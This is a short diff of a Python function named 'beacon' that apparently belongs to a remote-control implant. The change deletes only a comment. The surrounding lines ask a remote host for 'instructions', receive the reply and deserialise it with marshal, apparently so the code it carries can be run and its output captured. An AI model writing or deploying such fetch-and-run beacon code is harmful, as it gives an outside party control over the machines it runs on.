@@ -28,7 +28,6 @@ def beacon(host, port):
         client_socket.send(b"get_instructions")
         
         instructions = client_socket.recv(1024)
-        # decode ?
         if instructions:
             instructions = marshal.loads(instructions)
             stdout_buffer = StringIO()
